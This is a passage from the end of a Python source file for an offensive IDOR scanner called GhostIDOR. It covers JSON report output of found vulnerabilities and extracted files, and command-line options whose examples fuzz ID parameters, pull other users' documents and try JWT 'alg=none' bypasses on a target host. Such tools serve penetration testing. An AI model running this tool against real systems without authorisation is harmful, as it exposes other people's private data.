            'files_extracted': sum(1 for r in vulnerable_results if r.saved_file),
            'linked_files_downloaded': linked_files_count,
            'total_files': sum(1 for r in vulnerable_results if r.saved_file) + linked_files_count,
            'vulnerabilities': []
        }
        
        for result in vulnerable_results:
            vuln_data = {
                'technique': result.technique,
                'url': result.url,
                'method': result.method,
                'parameter': result.parameter,
                'original_value': result.original_value,
                'tested_value': result.tested_value,
                'status_code': result.status_code,
                'response_length': result.response_length,
                'evidence': result.evidence,
                'confidence': result.confidence,
                'curl_command': result.curl_command,
                'request_headers': result.request_headers,
                'response_headers': result.response_headers
            }
            if result.encoding_detected:
                vuln_data['encoding_detected'] = result.encoding_detected
            if result.saved_file and result.file_info:
                vuln_data['file_extracted'] = result.file_info
            if result.linked_files:
                vuln_data['linked_files'] = result.linked_files
            output_data['vulnerabilities'].append(vuln_data)
        
        with open(self.args.output, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n{Colors.GREEN}[+] Report saved to:{Colors.RESET} {self.args.output}")

def main():
    parser = argparse.ArgumentParser(
        description='GhostIDOR v2.4 - IDOR Scanner with High-Speed Fuzzing & File Extraction',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}Examples:{Colors.RESET}

  {Colors.BOLD}# Fuzz URL parameter with default payloads{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ

  {Colors.BOLD}# Fuzz URL parameter with custom wordlist{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/docs.php?uid=1" -p uid=FUZZ -w ids.txt

  {Colors.BOLD}# Fuzz POST data parameter{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/download.php" -m POST \\
    -d "file_id=123" -p file_id=FUZZ -w wordlist.txt

  {Colors.BOLD}# High-speed fuzzing with 20 threads{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/api/user?id=1" -p id=FUZZ \\
    -w ids.txt --threads 20

  {Colors.BOLD}# Fuzz with verbose output and file extraction{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/file?doc=1" -p doc=FUZZ \\
    -w numbers.txt -v --output-dir findings/

  {Colors.BOLD}# Test JWT-based IDOR{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com/api/profile" \\
    -H "Authorization: Bearer eyJ..." --advanced -v
  
  {Colors.BOLD}# Full scan with JS analysis and encoding detection{Colors.RESET}
  python ghostidor_v2.3.py -u "http://target.com" --analyze-js \\
    --detect-encoding -v -o report.json
        """
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    
    # NEW: Fuzzing options
    parser.add_argument('-p', '--fuzz-param', 
                       help='Parameter to fuzz (format: param=FUZZ). Works for URL params and POST data')
    parser.add_argument('-w', '--wordlist', 
                       help='Wordlist file for fuzzing payloads')
    parser.add_argument('--fuzz-count', type=int, default=100,
                       help='Number of default payloads to generate if no wordlist (default: 100)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads for fuzzing (default: 10)')
    parser.add_argument('--output-dir', default='ghostidor_findings',
                       help='Directory to save extracted files (default: ghostidor_findings)')
    
    # Authentication
    parser.add_argument('-c', '--cookie', dest='cookies', action='append', 
                       help='Cookie (format: name=value)')
    parser.add_argument('-H', '--header', dest='headers', action='append',
                       help='Custom header (format: Name: Value)')
    
    # Testing options
    parser.add_argument('-m', '--method', default='GET', 
                       choices=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
                       help='HTTP method to use (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (format: key=value&key2=value2)')
    parser.add_argument('--detect-encoding', action='store_true',
                       help='Detect and bypass encoded references')
    parser.add_argument('--analyze-js', action='store_true',
                       help='Analyze JavaScript files for IDOR patterns')
    parser.add_argument('--smart-recon', action='store_true',
                       help='Auto-detect IDOR patterns and exploit')
    parser.add_argument('--fuzz-range', help='Range for fuzzing (format: 1-100)')
    parser.add_argument('--advanced', action='store_true',
                       help='Enable advanced tests (JWT alg=none, etc.)')
    
    # Behavior options
    parser.add_argument('--delay', type=float, default=0,
                       help='Delay between requests in seconds (default: 0)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                       help='Request timeout (default: 10s)')
    parser.add_argument('--follow-redirects', action='store_true',
                       help='Follow redirects')
    parser.add_argument('--no-verify', action='store_true',
                       help='Disable SSL verification')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output JSON report file')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Verbose output (shows full request/response for findings)')
    
    # User agent
    parser.add_argument('--user-agent', default='GhostIDOR/2.3 (Ghost Ops Security)',
                       help='Custom User-Agent')
    
    args = parser.parse_args()
    
    # Validation
    if args.fuzz_param and 'FUZZ' not in args.fuzz_param:
        print(f"{Colors.RED}[!] Error: -p parameter must contain 'FUZZ' marker{Colors.RESET}")
        print(f"    Example: -p uid=FUZZ")
        sys.exit(1)
    
    try:
        scanner = GhostIDOR(args)
        results = scanner.run_all_tests(args.url)
        scanner.print_report(results)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Scan interrupted{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
